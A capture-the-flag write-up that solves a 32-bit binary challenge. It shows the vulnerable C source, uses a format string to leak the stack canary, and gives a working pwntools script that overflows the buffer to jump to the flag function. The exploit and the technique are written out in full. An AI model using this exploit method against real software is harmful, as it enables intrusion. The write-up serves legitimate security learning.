# Baby

---

### Challenge Description

How do you tackle cookies?

nc challenge1.lagncrash.com 10000

[baby.zip](https://github.com/caprinux/LagNCrash/files/6128453/baby.zip)

---

### Solution

DISCLAIMER: We did not solve this the intended way. 

```
$ pwn checksec babysource 

[*] '/media/babysource'

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)
```

Since theres canary in this binary, you will want to leak the canary so that you can override it and then override the return address.

Looking at the source file, 

```C
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void flag() {
  char buf[64];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
  printf("Run this on the server.\n");
  exit(0);
  }

  fgets(buf,64,f);
  printf(buf);
}
void init() {
      setbuf(stdin, NULL);
      setbuf(stdout, NULL);
     setbuf(stderr, NULL);
}
void vuln() {
     char buf[100];
     for(int i=0;i<2;i++){
         read(0, buf, 0x200);
         printf(buf);
     }
}
int main(void) {
     init();
     puts("Welcome.");
     vuln ();
     return 0;
}
```
We see that this binary executable takes in 2 read inputs.

So basically we see that this executable will take in 2 inputs of 100 bytes into buffer, and the read function will read 200 bytes from buffer. Hmm.

The flow of this executable is basically, the executable print "Welcome" in main() and then goes ahead to read 2 inputs in vuln() which they will print right out before it goes back to the main function that returns.

As you can see, we can overflow buffer and override the return address to our flag address. 

However, as we have seen, this file has stack canary and we need to find a way to overcome the canary, otherwise we cannot overflow as it would just reset us when the check fails.

Debugging and disassembling the vuln function in gdb-gef, we can find the start of array at ebp-0x70 and the canary at ebp-0x0c.

0x70 - 0x0c = 100

So we want to use a format string attack to try to leak the stack, and we try to fill it with enough %x just under 100 characters.

I open the file in gdb and set a breakpoint right after the first printf call, and then run it with "%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x" as my input 

_(notice that if you try anything more than this, you will likely get ``*** stack smashing detected ***: terminated`` because you are overwriting your stack canary and you are going to fail the canary check, remember that you only want to leak the canary and not override it yet because you cannot bypass the canary without the canary address)_

The binary file prints this

"ffffd6f8 200 80492cd f7fa7d20 0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 ff0a7825 97c5bc00 804a02b 804c000 "

Now to find out which one prints the canary address, we can compare with the value of the canary by doing ``x/w $ebp-0xc``. I get 97c5bc00 as my canary, and comparing it with the output of printf, I see that it corresponds with the 3rd last printed address.

Now that we know where to get the canary address, we can overflow the 100 bytes of buffer and pass the canary value so we can bypass the check.

The last thing we want to do is print the flag, so we need the flag address which can be easily obtained when you decompile the binary in ghidra, at the flag() function.

Now we can officially craft our exploit.

```py
from pwn import *

flag_addr = 0x080491d2
p = remote("challenge1.lagncrash.com", 10000)

p.recvuntil("Welcome.\n")
p.sendline(b"%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x")
data = p.recv()
canary = data.split(b" ")[-3]
print(canary)
canary = int(canary.decode(), 16)
p.sendline(b"A" * 100 + p32(canary) + b"A" * 12 + p32(flag_addr))
print(p.recv())
```

Executing the exploit, we get the file.

```
b'6f035700'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALNC{T00_EZ_M4Yb3?}\n'
```







